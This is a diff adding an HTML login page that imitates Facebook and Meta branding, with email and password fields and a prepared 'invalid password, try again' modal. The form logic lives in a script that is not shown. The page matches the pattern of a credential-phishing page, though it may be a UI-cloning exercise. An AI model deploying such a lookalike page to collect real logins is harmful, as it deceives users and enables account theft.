@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link rel="stylesheet" href="facebook.css">
+</head>
+<body>
+
+    <div class="logo">
+        <img src="https://i.pinimg.com/originals/0c/12/d3/0c12d348d3b82d9efbcc6a4fcd667f5c.png" alt="Logo" />
+    </div>
+
+    <form class="login-form" id="loginForm">
+        <label for="identifier">Mobile number or email address:</label>
+        <input type="text" id="identifier" placeholder="Mobile number or email address" required>
+        
+        <div class="password-container">
+            
+            <input type="password" placeholder="Password" required id="password">
+            <div class="eye-icon" id="eyeIcon" onclick="togglePassword()" aria-label="Toggle password visibility"></div>
+        </div>
+        
+        <button type="submit">Log In</button>
+        <p class="forgot-password">Forgotten Password?</p>
+    </form>
+
+    <button class="create-account">Create new account</button>
+
+    <footer>
+        <img src="meta-social-media-logo-symbol-with-name-black-design-illustration-free-vector-removebg-preview.png" alt="Meta Logo" width="77%" height="20%"/>
+    </footer>
+
+    <!-- Notification Modal -->
+    <div id="notificationModal" class="modal">
+        <div class="modal-content">
+            <span class="close-button" onclick="closeModal()">&times;</span>
+            <h2>Incorrect Email or Phone</h2>
+            <p>Invalid password. Please try again.</p>
+            <button onclick="closeModal()">Try Again</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
